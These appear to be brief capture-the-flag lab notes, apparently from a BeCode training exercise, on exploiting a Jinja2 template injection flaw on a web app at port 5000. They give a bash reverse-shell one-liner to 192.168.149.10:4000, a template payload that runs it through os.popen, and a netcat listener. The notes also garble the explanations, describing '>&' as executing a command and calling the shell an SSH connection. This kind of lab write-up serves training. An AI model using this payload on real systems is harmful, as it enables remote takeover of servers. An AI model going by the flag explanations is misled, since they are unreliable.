- http://10.11.1.2/ -- > Flag site BeCode

- L'ip 10.11.2.35 sur le port 5000

- Bash command :

```
bash -c "bash -i >& /dev/tcp/192.168.149.10/4000 0>&1"
```

- -c : read following string as a command
- -i : interactive
- >& : execute following command
- 0>&1 : output correct only

- Include the command in a python instruction and inject it on the vulnerable website :

```
{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/192.168.149.10/4000 0>&1"').read()}}
```

- Before pressing enter, open a shell and run the following netcat command in order to listen to potential SSH connection :

```
nc -lvp 4000
```